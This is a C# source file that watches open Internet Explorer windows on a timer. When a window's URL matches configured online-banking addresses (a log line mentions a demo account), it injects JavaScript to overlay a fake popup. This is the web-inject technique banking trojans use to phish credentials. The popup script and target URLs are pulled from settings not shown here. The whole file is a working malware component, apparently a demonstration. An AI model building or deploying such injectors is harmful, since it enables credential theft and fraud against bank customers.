using System;
using System.Timers;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Windows;
using System.Resources;
using SHDocVw;

namespace BrowserTabsMonitor
{
    internal class Program
    {
        private static Timer aTimer;
        private static IeClass ieInst;
        private static string jsCommand;
        private static string jsCSS;
        private static string jsPopupElement;
        private static List<int> matchedHwndList;

        private static void Main(string[] args)
        {
            SetTimer();
            jsCSS = FakePopup.Default.jsCSS;
            jsPopupElement = FakePopup.Default.jsPopupElement.Replace("$_jsCSS_$", jsCSS);
            jsCommand = FakePopup.Default.jsCommand.Replace("$_jsPopupElement_$", jsPopupElement);
            matchedHwndList = new List<int>();

            ieInst = new IeClass();

            Console.ReadKey();

        }

        private static void SetTimer()
        {
            aTimer = new Timer(FakePopup.Default.aTimerTimespan);
            aTimer.Elapsed += OnTimedEvent;
            aTimer.AutoReset = true;
            aTimer.Enabled = true;
        }

        private static void OnProgressChange(object a, ref object b)
        {
            Console.WriteLine($"a: {a} - b: {b}");
        }
        private static void OnTimedEvent(object source, ElapsedEventArgs e)
        {
            List<InternetExplorer> aInst = ieInst.GetIeInstances();
            Console.WriteLine($"Number of Instances found: {aInst.Count}");

            foreach (InternetExplorer instance in aInst)
            {
                Console.WriteLine($"HWND: {instance.HWND} - URL: {instance.LocationURL}");
                foreach (string match in FakePopup.Default.matchUrls)
                {
                    if (instance.LocationURL.Contains(match) && !matchedHwndList.Contains(instance.HWND))
                    {
                        Console.WriteLine("Found demo account for online banking, executing javascript...");
                        instance.Navigate($"javascript:{jsCommand}");
                        matchedHwndList.Add(instance.HWND);
                    }
                }
            }
        }
    }
}